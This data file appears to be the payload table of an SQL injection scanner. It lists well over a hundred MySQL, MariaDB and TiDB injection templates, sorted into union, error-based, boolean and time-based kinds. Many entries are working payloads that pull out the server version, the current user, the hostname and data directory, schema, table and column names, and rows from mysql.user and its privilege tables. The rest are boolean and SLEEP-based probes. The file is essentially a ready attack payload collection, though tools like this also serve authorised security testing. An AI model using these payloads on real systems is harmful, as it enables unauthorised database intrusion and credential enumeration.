  { id: 'mysql-union-114', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION ALL SELECT {NUM},@@version,user()-- -", where: 'value' },
  { id: 'mysql-union-115', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},@@hostname,@@version_compile_os-- -", where: 'value' },
  { id: 'mysql-union-116', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},@@hostname,@@version_compile_os-- -", where: 'value' },
  { id: 'mysql-union-117', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},current_user(),@@version_compile_machine-- -", where: 'value' },
  { id: 'mysql-union-118', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(schema_name) FROM information_schema.schemata),1-- -", where: 'value' },
  { id: 'mysql-union-119', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 3, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(grantee,0x3a,privilege_type) FROM information_schema.user_privileges LIMIT 1),1-- -", where: 'position' },
  { id: 'mysql-union-120', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},@@version,@@datadir-- -", where: 'value' },
  { id: 'mysql-union-121', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},database(),@@hostname-- -", where: 'value' },
  { id: 'mysql-union-122', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION ALL SELECT {NUM},current_user(),@@hostname-- -", where: 'value' },
  { id: 'mysql-union-123', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') UNION ALL SELECT {NUM},version(),user()-- -", where: 'value' },
  { id: 'mysql-union-124', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},concat_ws(0x3a,user(),database(),version()),1-- -", where: 'value' },
  { id: 'mysql-union-125', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION SELECT {NUM},(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1-- -", where: 'value' },
  { id: 'mysql-union-126', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION ALL SELECT {NUM},(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users'),1-- -", where: 'value' },
  { id: 'mysql-union-127', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},@@sql_mode,@@hostname-- -", where: 'value' },
  { id: 'mysql-union-128', dbms: ["MySQL","MariaDB","TiDB"], technique: 'union', level: 3, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(user,0x3a,host) FROM mysql.user LIMIT 1),1-- -", where: 'position' },
  { id: 'mysql-error-100', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND extractvalue(1,concat(0x7e,(SELECT version())))-- -", where: 'value' },
  { id: 'mysql-error-101', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND extractvalue(1,concat(0x7e,(SELECT version())))-- -", where: 'value' },
  { id: 'mysql-error-102', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -", where: 'value' },
  { id: 'mysql-error-103', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -", where: 'value' },
  { id: 'mysql-error-104', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -", where: 'value' },
  { id: 'mysql-error-105', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -", where: 'value' },
  { id: 'mysql-error-106', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT @@datadir)))-- -", where: 'value' },
  { id: 'mysql-error-107', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)),1)-- -", where: 'position' },
  { id: 'mysql-error-108', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) LIMIT 1)))-- -", where: 'position' },
  { id: 'mysql-error-109', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 2, risk: 1, clause: ["groupby"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", where: 'value' },
  { id: 'mysql-error-110', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND GTID_SUBSET(CONCAT((SELECT version())),1)-- -", where: 'value' },
  { id: 'mysql-error-111', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND exp(~(SELECT * FROM (SELECT version())a))-- -", where: 'value' },
  { id: 'mysql-error-112', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND exp(~(SELECT * FROM (SELECT user())a))-- -", where: 'value' },
  { id: 'mysql-error-113', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT_ws(0x3a,version(),database()))s),8446744073709551610,8446744073709551610)))-- -", where: 'value' },
  { id: 'mysql-error-114', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND GTID_SUBTRACT((SELECT version()),1)-- -", where: 'value' },
  { id: 'mysql-error-115', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND JSON_KEYS((SELECT version()))-- -", where: 'value' },
  { id: 'mysql-error-116', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND JSON_VALUE((SELECT version()),'$')-- -", where: 'value' },
  { id: 'mysql-error-117', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND ST_LatFromGeoHash((SELECT database()))-- -", where: 'value' },
  { id: 'mysql-error-118', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND ST_LongFromGeoHash((SELECT user()))-- -", where: 'value' },
  { id: 'mysql-error-119', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND ST_PointFromGeoHash((SELECT version()),1)-- -", where: 'value' },
  { id: 'mysql-error-120', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND polygon((SELECT * FROM (SELECT * FROM (SELECT version())a)b))-- -", where: 'value' },
  { id: 'mysql-error-121', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))#", where: 'value' },
  { id: 'mysql-error-122', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))/**/", where: 'value' },
  { id: 'mysql-error-123', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["update"], boundary: [")"], template: "{ORIG}),(1,(SELECT extractvalue(1,concat(0x7e,(SELECT version()))))) )-- -", where: 'value' },
  { id: 'mysql-error-124', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 5, risk: 1, clause: ["having"], boundary: ["","'",")","\")"], template: "{ORIG} HAVING 1=1-- -", where: 'value' },
  { id: 'mysql-error-125', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["limit"], boundary: [""], template: "{ORIG} LIMIT 1,1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))))-- -", where: 'position' },
  { id: 'mysql-error-126', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND EXP(~(SELECT * FROM (SELECT version())a))-- -", where: 'value' },
  { id: 'mysql-error-127', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND EXP(~(SELECT * FROM (SELECT version())a))-- -", where: 'value' },
  { id: 'mysql-error-128', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND EXP(~(SELECT * FROM (SELECT database())a))-- -", where: 'value' },
  { id: 'mysql-error-129', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND EXP(~(SELECT * FROM (SELECT user())a))-- -", where: 'value' },
  { id: 'mysql-error-130', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND EXP(~(SELECT * FROM (SELECT version())a))#", where: 'value' },
  { id: 'mysql-error-131', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND EXP(~(SELECT * FROM (SELECT version())a))/**/", where: 'value' },
  { id: 'mysql-error-132', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND JSON_KEYS((SELECT CAST((SELECT version()) AS JSON)))-- -", where: 'value' },
  { id: 'mysql-error-133', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND JSON_KEYS((SELECT CAST((SELECT database()) AS JSON)))-- -", where: 'value' },
  { id: 'mysql-error-134', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND JSON_KEYS((SELECT CAST((SELECT user()) AS JSON)))-- -", where: 'value' },
  { id: 'mysql-error-135', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND JSON_KEYS((SELECT CAST((SELECT version()) AS JSON)))#", where: 'value' },
  { id: 'mysql-error-136', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND JSON_KEYS((SELECT CAST((SELECT version()) AS JSON)))/**/", where: 'value' },
  { id: 'mysql-error-137', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND JSON_VALUE((SELECT CAST((SELECT version()) AS JSON)),'$')-- -", where: 'value' },
  { id: 'mysql-error-138', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND ST_GeomFromGeoJSON((SELECT version()))-- -", where: 'value' },
  { id: 'mysql-error-139', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -", where: 'value' },
  { id: 'mysql-error-140', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND extractvalue(1,concat(0x7e,(SELECT version())))-- -", where: 'value' },
  { id: 'mysql-error-141', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -", where: 'value' },
  { id: 'mysql-error-142', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT @@hostname)))-- -", where: 'value' },
  { id: 'mysql-error-143', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT user FROM mysql.user LIMIT 1)))-- -", where: 'position' },
  { id: 'mysql-error-144', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT @@datadir)),1)-- -", where: 'value' },
  { id: 'mysql-error-145', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT @@hostname)),1)-- -", where: 'value' },
  { id: 'mysql-error-146', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT CONCAT(user,0x3a,host) FROM mysql.user LIMIT 1)),1)-- -", where: 'position' },
  { id: 'mysql-error-147', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT extractvalue(1,concat(0x7e,(SELECT version()))))-- -", where: 'value' },
  { id: 'mysql-error-148', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 1)))-- -", where: 'position' },
  { id: 'mysql-error-149', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 1)),1)-- -", where: 'position' },
  { id: 'mysql-error-150', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["update"], boundary: [")"], template: "{ORIG}),(1,(SELECT extractvalue(1,concat(0x7e,(SELECT database()))))) )-- -", where: 'value' },
  { id: 'mysql-error-151', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["update"], boundary: [")"], template: "{ORIG}),(1,updatexml(1,concat(0x7e,(SELECT version())),1))-- -", where: 'value' },
  { id: 'mysql-error-152', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 4, risk: 1, clause: ["update"], boundary: [")"], template: "{ORIG}),(1,(SELECT 1/0))-- -", where: 'value' },
  { id: 'mysql-error-153', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND PROCEDURE ANALYSE(EXTRACTVALUE(9, CONCAT(0x5c, (SELECT VERSION()))), 1)-- -", where: 'value' },
  { id: 'mysql-error-154', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7b, 0x22, VERSION(), 0x22, 0x7d)) USING utf8)), 1)-- -", where: 'value' },
  { id: 'mysql-error-155', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND GTID_SUBTRACT((SELECT SESSION_GTID_EXECUTED()), 0)-- -", where: 'value' },
  { id: 'mysql-error-156', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND ST_X(ST_GeomFromText(CONCAT(0x4c, 0x49, 0x4e, 0x45, 0x53, 0x54, 0x52, 0x49, 0x4e, 0x47, 0x28, 0x30, 0x20, 0x30, 0x2c, 0x31, 0x29)))-- -", where: 'value' },
  { id: 'mysql-error-157', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND EXP(~(SELECT * FROM (SELECT VERSION())a))-- -", where: 'value' },
  { id: 'mysql-error-158', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND CAST((SELECT VERSION()) AS UNSIGNED)-- -", where: 'value' },
  { id: 'mysql-boolean-100', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1'='2", where: 'value' },
  { id: 'mysql-boolean-101', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND \"1\"=\"2", where: 'value' },
  { id: 'mysql-boolean-102', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' OR '1'='2", where: 'value' },
  { id: 'mysql-boolean-103', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=1/**/", falseTemplate: "{ORIG}' AND 1=2/**/", where: 'value' },
  { id: 'mysql-boolean-104', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 2, risk: 1, clause: ["update"], boundary: [")"], template: "{ORIG}),(1,1)-- -", where: 'value' },
  { id: 'mysql-boolean-105', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 2, risk: 1, clause: ["update"], boundary: [")"], template: "{ORIG}),(1,(SELECT 1))-- -", where: 'value' },
  { id: 'mysql-boolean-106', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 2, risk: 1, clause: ["limit"], boundary: [""], template: "{ORIG} LIMIT 1,1-- -", where: 'position' },
  { id: 'mysql-boolean-107', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CHAR(49)-- -", where: 'value' },
  { id: 'mysql-boolean-108', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 0x31=1-- -", where: 'value' },
  { id: 'mysql-boolean-109', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 2, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} OR 1=1-- -", falseTemplate: "{ORIG} OR 1=2-- -", where: 'value' },
  { id: 'mysql-boolean-110', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 5, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT 1)=(SELECT 1)-- -", falseTemplate: "{ORIG} AND (SELECT 1)=(SELECT 2)-- -", where: 'value' },
  { id: 'mysql-boolean-111', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 2, risk: 1, clause: ["groupby"], boundary: ["","'",")","\")"], template: "{ORIG} GROUP BY 1-- -", where: 'value' },
  { id: 'mysql-boolean-112', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 2, risk: 1, clause: ["orderby"], boundary: ["","'",")","\")"], template: "{ORIG} ORDER BY 1,2-- -", where: 'position' },
  { id: 'mysql-boolean-113', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND 1=1-- -", falseTemplate: "{ORIG}')) AND 1=2-- -", where: 'value' },
  { id: 'mysql-boolean-114', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\"))"], template: "{ORIG}\")) AND 1=1-- -", falseTemplate: "{ORIG}\")) AND 1=2-- -", where: 'value' },
  { id: 'mysql-boolean-115', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: [")"], template: "{ORIG}) AND 1=1-- -", falseTemplate: "{ORIG}) AND 1=2-- -", where: 'value' },
  { id: 'mysql-boolean-116', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\"))"], template: "{ORIG}\")) AND '1'='1'-- -", falseTemplate: "{ORIG}\")) AND '1'='2'-- -", where: 'value' },
  { id: 'mysql-boolean-117', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CHAR(49,61,49)-- -", where: 'value' },
  { id: 'mysql-boolean-118', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 0x31=0x31-- -", where: 'value' },
  { id: 'mysql-boolean-119', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 0x31=0x32-- -", where: 'value' },
  { id: 'mysql-boolean-120', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND UNHEX('31')=1-- -", where: 'value' },
  { id: 'mysql-boolean-121', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND UNHEX('32')=1-- -", where: 'value' },
  { id: 'mysql-boolean-122', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(0x31,SIGNED)-- -", where: 'value' },
  { id: 'mysql-boolean-123', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(0x32,SIGNED)-- -", where: 'value' },
  { id: 'mysql-boolean-124', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT SUBSTR(@@version,1,1))='5'-- -", falseTemplate: "{ORIG} AND (SELECT SUBSTR(@@version,1,1))='8'-- -", where: 'value' },
  { id: 'mysql-boolean-125', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT SUBSTR(database(),1,1))='d'-- -", falseTemplate: "{ORIG} AND (SELECT SUBSTR(database(),1,1))='x'-- -", where: 'value' },
  { id: 'mysql-boolean-126', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT SUBSTR(@@version,1,1))='5'-- -", falseTemplate: "{ORIG}' AND (SELECT SUBSTR(@@version,1,1))='8'-- -", where: 'value' },
  { id: 'mysql-boolean-127', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT LEFT(@@version,1))='5'-- -", falseTemplate: "{ORIG} AND (SELECT LEFT(@@version,1))='8'-- -", where: 'value' },
  { id: 'mysql-boolean-128', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT MID(@@version,1,1))='5'-- -", falseTemplate: "{ORIG} AND (SELECT MID(@@version,1,1))='8'-- -", where: 'value' },
  { id: 'mysql-boolean-129', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT @@version) LIKE '5%'-- -", where: 'value' },
  { id: 'mysql-boolean-130', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT @@version) LIKE '8%'-- -", where: 'value' },
  { id: 'mysql-boolean-131', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT LENGTH(database()))>0-- -", falseTemplate: "{ORIG} AND (SELECT LENGTH(database()))<0-- -", where: 'value' },
  { id: 'mysql-boolean-132', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND EXISTS(SELECT 1)-- -", falseTemplate: "{ORIG} AND EXISTS(SELECT 1 WHERE 1=2)-- -", where: 'value' },
  { id: 'mysql-boolean-133', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND IF(1=1,1,0)-- -", falseTemplate: "{ORIG} AND IF(1=2,1,0)-- -", where: 'value' },
  { id: 'mysql-boolean-134', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT 1 FROM DUAL WHERE 1=1)-- -", falseTemplate: "{ORIG} AND (SELECT 1 FROM DUAL WHERE 1=2)-- -", where: 'value' },
  { id: 'mysql-boolean-135', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' OR '1'='1'-- -", falseTemplate: "{ORIG}' OR '1'='2'-- -", where: 'value' },
  { id: 'mysql-boolean-136', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 2, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} OR '1'='1'-- -", falseTemplate: "{ORIG} OR '1'='2'-- -", where: 'value' },
  { id: 'mysql-boolean-137', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1' RLIKE (SELECT CASE WHEN (1=1) THEN '1' ELSE '0' END)-- -", where: 'value' },
  { id: 'mysql-time-100', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND SLEEP({SLEEP})-- -", where: 'value' },
  { id: 'mysql-time-101', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND SLEEP({SLEEP})-- -", where: 'value' },
  { id: 'mysql-time-102', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND SLEEP({SLEEP})-- -", where: 'value' },
  { id: 'mysql-time-103', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") AND SLEEP({SLEEP})-- -", where: 'value' },
